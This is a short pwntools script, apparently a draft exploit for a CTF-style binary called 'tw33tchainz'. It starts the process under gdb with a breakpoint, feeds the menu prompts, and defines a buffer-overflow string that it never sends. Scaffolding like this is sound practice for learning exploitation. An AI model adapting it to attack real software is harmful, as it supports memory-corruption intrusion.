from pwn import *
import sys

context.terminal = ['tmux', 'splitw', '-h']
s = process("./tw33tchainz")
gdb.attach(s, 'b *0x80493da')

overflow = "\x41" * 64 + "\x0d"

s.recv()						# name
s.sendline('AAAA')
s.recv()
s.sendline('BBBB')				# salt
s.recv()
s.sendline()
s.sendline(str('3'))	# menu item
s.recv()
s.sendline('AAAA')		# send password
s.recv()
s.sendline('6')
s.recv()
s.interactive()


